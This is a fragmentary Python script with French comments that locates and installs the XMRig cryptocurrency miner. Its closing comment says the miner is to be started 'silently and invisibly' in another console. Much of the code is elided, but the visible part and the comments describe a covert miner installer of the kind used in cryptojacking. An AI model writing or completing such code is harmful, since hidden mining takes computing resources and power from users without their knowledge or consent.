...
# Chemin vers le fichier xmrig.exe
xmrig_exe_path = os.path.join(xmrig_path, "xmrig.exe")

# Vérifier si xmrig.exe est déjà installé
if not os.path.exists(xmrig_exe_path):
    ...
    print("Installation de XMrig terminée.")
...
# Démarrer xmrig.exe en mode silencieux et invisible dans une autre console
